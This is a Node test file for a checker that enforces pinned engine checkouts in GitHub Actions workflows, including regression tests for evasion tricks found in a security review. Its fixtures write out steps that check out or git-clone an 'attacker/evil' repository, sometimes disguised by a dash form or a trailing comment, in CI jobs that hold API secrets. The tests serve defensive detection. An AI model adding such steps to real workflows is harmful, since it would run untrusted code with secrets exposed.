import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { checkWorkflowText, engineCheckoutBlocks } from './check-engine-pins.mjs';

const repo = 'Onstage-CEO/oseg-resort-audit';
const productionRef = '67daf35c887e3509434978ffe7937df6b6385980';
const candidateRef = '79df0ad7a9928590bcc2e1ea3771ae52bbeb85a6';

function workflow(path = 'engine', refName = 'ENGINE_REF') {
  return [
    'name: fixture',
    'env:',
    '  ENGINE_REPO: ' + repo,
    '  ENGINE_REF: ' + productionRef,
    '  ENGINE_SHA: ' + candidateRef,
    'jobs:',
    '  verify:',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '      - name: Checkout engine',
    '        uses: actions/checkout@v4',
    '        with:',
    '          repository: ${{ env.ENGINE_REPO }}',
    '          ref: ${{ env.' + refName + ' }}',
    '          path: ' + path,
    ''
  ].join('\n');
}

describe('engine checkout pin alignment', () => {
  it('accepts the production pin regardless of checkout path name', () => {
    const result = checkWorkflowText('capture.yml', workflow('engine'), repo, productionRef, {});
    assert.deepEqual(result.failures, []);
    assert.equal(result.isolated, false);
  });

  it('detects candidate-engine instead of hiding it', () => {
    assert.equal(engineCheckoutBlocks(workflow('candidate-engine')).length, 1);
  });

  it('accepts an explicitly declared isolated clean-room SHA', () => {
    const filename = 'clean-room.yml';
    const result = checkWorkflowText(
      filename,
      workflow('candidate-engine', 'ENGINE_SHA'),
      repo,
      productionRef,
      { [filename]: candidateRef }
    );
    assert.deepEqual(result.failures, []);
    assert.equal(result.isolated, true);
  });

  it('rejects an undeclared candidate SHA', () => {
    const result = checkWorkflowText(
      'hidden-candidate.yml',
      workflow('candidate-engine', 'ENGINE_SHA'),
      repo,
      productionRef,
      {}
    );
    assert.match(result.failures.join('\n'), /expected 67daf35c/);
  });

  it('rejects a declared clean-room workflow on the wrong candidate SHA', () => {
    const filename = 'clean-room.yml';
    const result = checkWorkflowText(
      filename,
      workflow('candidate-engine', 'ENGINE_REF'),
      repo,
      productionRef,
      { [filename]: candidateRef }
    );
    assert.match(result.failures.join('\n'), /expected 79df0ad7/);
  });

  it('rejects an external checkout without an isolated path', () => {
    const text = workflow('engine').replace('          path: engine\n', '');
    assert.match(
      checkWorkflowText('missing-path.yml', text, repo, productionRef, {}).failures.join('\n'),
      /isolated path/
    );
  });
});

// Regression tests for the bypasses found in the 2026-07-27 security review.
// Each of these previously returned "OK" while attacker-controlled code would
// have executed with APIFY/DATAFORSEO/ANTHROPIC secrets and the engine deploy
// key in scope.
describe('security review 2026-07-27 — checkout detection cannot be evaded', () => {
  const engineStep = (repo, ref) =>
    `      - name: Checkout engine\n` +
    `        uses: actions/checkout@v4\n` +
    `        with:\n` +
    `          repository: ${repo}\n` +
    `          ref: ${ref}\n` +
    `          path: engine\n`;
  const wrap = (steps, env = 'ENGINE_REF: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n') =>
    `name: t\nenv:\n  ENGINE_REPO: acme/engine\n  ${env}jobs:\n  j:\n    steps:\n${steps}`;
  const APPROVED = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';

  it('sees a checkout written in the "- uses:" dash form', () => {
    const yaml = wrap(
      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
        `      - uses: actions/checkout@v4\n` +
        `        with:\n` +
        `          repository: attacker/evil\n` +
        `          ref: main\n` +
        `          path: evil\n`,
    );
    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
    assert.ok(r.failures.some((f) => f.includes('attacker/evil')), 'dash-form checkout must be detected');
  });

  it('sees a checkout line carrying a trailing comment', () => {
    const yaml = wrap(
      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
        `      - name: sneak\n` +
        `        uses: actions/checkout@v4  # routine\n` +
        `        with:\n` +
        `          repository: attacker/evil\n` +
        `          ref: main\n` +
        `          path: evil\n`,
    );
    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
    assert.ok(r.failures.some((f) => f.includes('attacker/evil')), 'commented checkout must be detected');
  });

  it('refuses to guess when ENGINE_REF is declared twice with different values', () => {
    const yaml = wrap(
      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
        `      - name: shadow\n` +
        `        env:\n` +
        `          ENGINE_REF: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n` +
        `        run: echo hi\n`,
    );
    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
    assert.ok(r.failures.some((f) => f.includes('ambiguous')), 'conflicting ENGINE_REF must fail closed');
  });

  it('flags code fetched outside actions/checkout', () => {
    const yaml = wrap(
      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
        `      - name: fetch\n` +
        `        run: git clone https://github.com/attacker/evil.git evil\n`,
    );
    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
    assert.ok(r.failures.some((f) => f.includes('outside actions/checkout')), 'external clone must be flagged');
  });

  it('a dash-form step does not swallow the next step\'s repository/ref', () => {
    const yaml = wrap(
      `      - uses: actions/checkout@v4\n` +
        `        with:\n` +
        `          ref: some-branch\n` +
        engineStep('acme/engine', '${{ env.ENGINE_REF }}'),
    );
    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
    assert.deepStrictEqual(r.failures, [], 'a self-checkout plus one engine checkout is valid');
  });
});
